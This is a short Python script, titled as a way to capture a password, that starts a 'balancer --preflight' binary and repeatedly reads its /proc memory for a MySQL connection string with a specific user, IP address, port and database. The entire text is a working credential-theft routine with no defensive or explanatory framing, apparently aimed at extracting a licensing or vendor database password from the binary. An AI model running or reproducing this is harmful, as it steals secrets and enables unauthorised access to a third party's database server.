Capture password from short-lived preflight process by scanning its memory while running
python3 - <<'PY'
import subprocess, time, os, re, signal

proc = subprocess.Popen(['/home/xtreamaster/bin/balancer','--preflight'],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
time.sleep(0.05)
pid = proc.pid
print('pid', pid)
found=set()
# poll memory repeatedly while process lives
deadline=time.time()+8
pat = re.compile(rb'xtream_masters_user:([^@\x00]{1,128})@tcp\(45\.155\.90\.47:7999\)/xtreammasters')
pat2 = re.compile(rb'xtream_masters_user.{0,200}7999.{0,80}')
pat3 = re.compile(rb'user=xtream_masters_user.{0,120}')
while time.time()<deadline and proc.poll() is None:
  try:
    maps=open(f'/proc/{pid}/maps').read().splitlines()
  except Exception as e:
    break
  try:
    mem=open(f'/proc/{pid}/mem','rb', buffering=0)
  except Exception as e:
    print('mem open fail', e)
    break
  for line in maps:
    perms=line.split()[1]
    if 'r' not in perms: continue
    a,b=[int(x,16) for x in line.split()[0].split('-')]
    if b-a>30_000_000: continue
    try:
      mem.seek(a); data=mem.read(b-a)
    except Exception:
      continue
    for p in (pat, pat2, pat3):
      for m in p.finditer(data):
        frag=m.group()
        s=''.join(chr(c) if 32<=c<127 else '.' for c in frag)
        if s not in found:
          found.add(s)
          print('HIT:', s)
  mem.close()
  time.sleep(0.02)
out=proc.communicate(timeout=15)[0].decode('utf-8','replace')
for line in out.splitlines():
  if 'license' in line.lower() or 'mysql' in line.lower():
    print(line)
print('unique hits', len(found))
